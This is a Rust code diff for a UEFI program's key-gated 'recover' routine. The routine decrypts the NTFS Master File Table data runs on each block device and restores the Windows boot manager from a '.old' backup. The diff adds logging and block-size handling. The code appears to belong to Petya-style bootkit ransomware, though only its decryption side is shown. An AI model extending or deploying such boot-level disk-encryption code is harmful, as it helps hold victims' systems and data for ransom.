@@ -4,6 +4,7 @@ use alloc::vec;
 use alloc::vec::Vec;
 use core::fmt::Write;
 use core::ops::Range;
+use log::info;
 use uefi::proto::media::block::BlockIO;
 use uefi::table::runtime::ResetType;
 use uefi::table::{Boot, SystemTable};
@@ -82,21 +83,27 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
     st.stdout().write_str("\nRight key !").unwrap();
     st.stdout().write_str("\nStart decrypting...").unwrap();
 
+    let mut c = 0;
     // Get list of handles which instantiate a BlockIO
     let handles = st.boot_services().find_handles::<BlockIO>()?;
     for handle in handles {
         let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;
         let blk = unsafe { &mut *blk.get() };
 
+        c += 1;
+        info!("BLK{}", c);
+
         let blk_media = blk.media();
         let media_id = blk_media.media_id();
+        let block_size = blk_media.block_size();
 
-        let mut buf = [0u8; 512];
+        let mut buf = vec![0u8; block_size as usize];
         blk.read_blocks(media_id, 0, &mut buf)?;
 
         if &buf[3..11] != OEM_ID {
             continue;
         }
+        info!("FOUND NTFS!");
 
         let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap()) * 8;
         let first_run_size = u64::from_ne_bytes(buf[72..80].try_into().unwrap());
@@ -104,19 +111,26 @@ pub fn recover(st: &mut SystemTable<Boot>, key_bytes: &[u8]) -> uefi::Result {
         // Decrypt first data run
         decrypt_data_run(blk, media_id, key, mft_start..mft_start + first_run_size)?;
 
+        info!("DECRYPTED FUN DATA RUN");
+
         let mut entry_buf = [0u8; 1024];
-        read_mft_entry(blk, media_id, mft_start, &mut buf, &mut entry_buf).unwrap();
+        read_mft_entry(blk, media_id, mft_start, &mut buf, &mut entry_buf)?;
 
         let mut ranges = get_data_runs(&entry_buf)?;
         ranges.remove(0);
 
+        info!("FOUND EVERY DATA RUNS");
+
         for range in ranges {
             decrypt_data_run(blk, media_id, key, range)?;
         }
+
+        info!("DECRYPTED EVERY DATA RUNS");
     }
 
     st.stdout().write_str("\nFinished !").unwrap();
 
+    // TODO: Try to find the right handle to call the filesystem protocol.
     let windows_image = read_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi.old")?;
     write_file(st, r"EFI\Microsoft\Boot\bootmgfw.efi", &windows_image)?;
 
